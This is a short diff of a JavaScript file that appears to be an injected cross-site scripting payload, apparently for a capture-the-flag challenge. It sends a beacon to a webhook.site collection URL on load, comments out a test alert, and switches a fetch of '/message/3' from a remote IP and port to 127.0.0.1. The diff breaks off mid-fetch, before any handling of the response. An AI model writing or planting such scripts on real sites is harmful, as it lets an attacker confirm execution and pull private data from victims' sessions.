@@ -1,7 +1,7 @@
 
 
 fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/attempt');
-alert('test');
+//alert('test');
 
 function encodeStringForURL(str) {
   return encodeURIComponent(str).replace(/[!'()*]/g, function(c) {
@@ -10,7 +10,7 @@ function encodeStringForURL(str) {
 }
 
 
-fetch('http://209.97.185.157:31427/message/3')
+fetch('http://127.0.0.1/message/3')
   .then(response => {
     if (!response.ok) {
       throw new Error('Network response was not ok');
